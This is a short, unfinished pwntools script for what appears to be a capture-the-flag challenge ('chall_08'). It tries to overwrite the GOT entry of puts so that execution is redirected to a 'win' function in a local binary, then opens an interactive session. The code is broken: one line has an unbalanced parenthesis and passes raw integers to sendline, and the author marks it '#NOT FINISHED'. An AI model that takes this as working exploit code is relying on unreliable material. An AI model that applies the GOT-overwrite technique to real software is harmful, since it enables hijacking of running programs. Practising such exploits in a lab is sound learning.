from pwn import *
binary = context.binary = ELF('./chall_08')
p = process(binary.path)
p.sendline(binary.got.puts - binary.sym.target) // 8)
p.sendline(binary.sym.win)
p.interactive()
#NOT FINISHED
